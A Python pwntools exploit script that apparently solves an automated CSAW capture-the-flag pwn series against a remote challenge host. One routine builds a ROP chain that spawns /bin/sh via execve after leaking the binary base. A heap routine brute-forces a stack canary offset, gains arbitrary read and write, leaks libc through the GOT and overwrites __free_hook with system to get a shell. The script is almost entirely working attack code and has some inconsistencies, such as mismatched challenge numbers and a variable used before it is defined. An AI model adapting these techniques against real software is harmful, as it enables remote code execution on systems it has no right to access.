import pwn
import os
import get_rop
import get_file
pwn.context.terminal = ['tmux', 'splitw', '-h']


password = b"8d16635db965bc4e0a97521e8105fad2"


def solve_rop(idx):
    global password
    elf = pwn.ELF(f"./chall{idx}", checksec=False)
    if pwn.args.GDB:
        io = pwn.gdb.debug(f"./chall{idx}")
    elif pwn.args.REMOTE:
        io = pwn.remote("auto-pwn.chal.csaw.io", 11000+idx)
    else:
        io = pwn.process(f"chall{idx}")
    io.recvuntil(b">")
    io.sendline(password)
    io.recvuntil(
        b"-------------------------------------------------------------------\n")
    io.recvuntil(
        b"-------------------------------------------------------------------\n")
    # Leak
    io.recvuntil(b"Main is at ")
    leak = io.recvline()[:-1].decode()
    leak = '0x'+leak
    leak = int(leak, 16)
    rop = pwn.ROP(elf)
    elf.address = leak - 5153

    # Rop Gadgets
    pop_rdx = pwn.p64(rop.rdx.address+elf.address)
    pop_rax = pwn.p64(rop.rax.address+elf.address)
    xor_rax = pwn.p64(elf.address+get_rop.get_rax(idx))
    pop_rdi = pwn.p64(rop.rdi.address+elf.address)
    pop_rsi = pwn.p64(rop.rsi.address+elf.address)
    pop_rdx = pwn.p64(rop.rdx.address+elf.address)
    syscall = pwn.p64(rop.find_gadget(['syscall', 'ret']).address+elf.address)
    mov_rdx_rax = pwn.p64(elf.address+get_rop.get_mov(idx))

    # Payload
    payload = b"A"*9
    payload += pop_rdx
    payload += pwn.p64(elf.address + 0x4040)
    payload += pop_rax
    payload += b"/bin/sh\0"
    payload += mov_rdx_rax
    payload += pop_rdx
    payload += pwn.p64(elf.address+0x4048)
    payload += xor_rax
    payload += mov_rdx_rax
    payload += pop_rdi
    payload += pwn.p64(elf.address + 0x4040)
    payload += pop_rsi
    payload += pwn.p64(elf.address+0x4048)
    payload += pop_rdx
    payload += pwn.p64(elf.address+0x4048)
    payload += pop_rax
    payload += pwn.p64(59)
    payload += syscall
    io.sendline(payload)
    io.sendline(b"cat message.txt")
    mssg = io.clean(timeout=1)
    next_pass = mssg.split()[-1]
    io.close()
    return next_pass


def solve_heap(idx):

    pwn.context.terminal = ['tmux', 'splitw', '-h']
    elf = pwn.context.binary = pwn.ELF("./chall23")
    libc = pwn.ELF("../.glibc/glibc_2.24/libc.so.6")
    if pwn.args.GDB:
        io = pwn.gdb.debug("./chall22", gdbscript="")
    elif pwn.args.REMOTE:
        io = pwn.remote("auto-pwn.chal.csaw.io", 11022)
        libc = pwn.ELF("./libc.so.6")
    else:
        io = elf.process()

    def edit(idx, size, val):
        io.sendlineafter(b": ", b"1")
        io.sendlineafter(b": ", str(idx).encode())
        io.sendlineafter(b"? ", str(size+1).encode())
        io.sendafter(b": ", val)

    def edit2(idx, size, val, io2):
        io2.sendlineafter(b": ", b"1")
        io2.sendlineafter(b": ", str(idx).encode())
        io2.sendlineafter(b"? ", str(size+1).encode())
        io2.sendafter(b": ", val)

    def view(idx):
        io.sendlineafter(b": ", b"2")
        io.sendlineafter(b": ", str(idx).encode())
        io.recvuntil(b"reads: ")
        mssg = io.recvline(keepends=False)
        print(mssg)
        return mssg

    def view2(idx, io3):
        io3.sendlineafter(b": ", b"2")
        io3.sendlineafter(b": ", str(idx).encode())
        io3.recvuntil(b"reads: ")
        mssg = io3.recvline(keepends=False)
        print(mssg)
        return mssg

    def quit():
        io.sendlineafter(b": ", b"3")

    def leak_canary_offset():
        global offset
        with elf.process() as io2:
            io2.recvuntil(b'>')
            io2.sendline(password)
            io2.recvuntil(
                b"-------------------------------------------------------------------\n")
            io2.recvuntil(
                b"-------------------------------------------------------------------\n")
            while True:
                edit2(1, offset+1+16, b"A"*offset + b"\x00" + canary, io2)
                mssg = io2.recvline()
                if b'Error' in mssg:
                    io2.close()
                    break
                else:
                    offset += 1
        # edit(1, 123, b"A"*106+b"\x00"+b"vJpCKGIunmYuqmvM")
        # return b"vJpCKGIunmYuqmvM"

    def leak_next_offset():
        global next_offset
        while True:
            with elf.process() as io3:
                print(next_offset)
                io3.recvuntil(b'>')
                io3.sendline(password)
                io3.recvuntil(
                    b"-------------------------------------------------------------------\n")
                io3.recvuntil(
                    b"-------------------------------------------------------------------\n")
                edit2(1, offset+1+16+next_offset+8, b"A"*offset +
                      b"\x00"+canary+b"A"*next_offset+pwn.p64(0x4040c0), io3)
                try:
                    mssg = view2(2, io3)
                    print(mssg)
                    if mssg == canary:
                        io3.kill()
                        break
                    else:
                        next_offset += 1
                        io3.kill()
                except:
                    next_offset += 1
                    try:
                        io3.kill()
                        pass
                    except:
                        pass

    def arbitary_read(addr):
        edit(1, offset+1+16+next_offset+8, b"A"*offset +
             b"\x00"+canary+b"A"*next_offset+pwn.p64(addr))
        leak = pwn.unpack(view(2), "all")
        print(hex(leak))
        return leak

    def arbitary_write(addr, val):
        edit(1, offset+1+16+next_offset+8, b"A"*offset +
             b"\x00"+canary+b"A"*next_offset+pwn.p64(addr))
        edit(2, 8, val)

    password = b'342a9e29cc966b56dfe9dc88500b8f9a'
    io.recvuntil(b'>')
    io.sendline(password)
    io.recvuntil(
        b"-------------------------------------------------------------------\n")
    io.recvuntil(
        b"-------------------------------------------------------------------\n")
    canary = canary.leak_canary(23)
    print(canary)
    offset = 0
    leak_canary_offset()
    offset += 16
    print(offset)
    next_offset = 0
    leak_next_offset()
    puts_got_addr = arbitary_read(elf.got.puts)
    libc.address = puts_got_addr - libc.sym.puts
    print(hex(libc.address))
    arbitary_write(libc.sym.__free_hook, pwn.p64(libc.sym.system))
    edit(1, 8, b"/bin/sh\0")
    quit()
    # io.sendline(b"cat message.txt")
    # mssg = io.clean(timeout=1)
    # print(mssg)
    io.interactive()


# for _ in range(0, 20):
#     get_file.create_files(_+1, password)
#     password = solve_rop(_+1)
#     pwn.log.success(f"Password for Level {_+2}: {password}")


password_21 = b'13462b403d91edd8c8389517c1eca3ed'
password = password_21
solve_heap(21)
# get_file.create_heap_file(21, password)
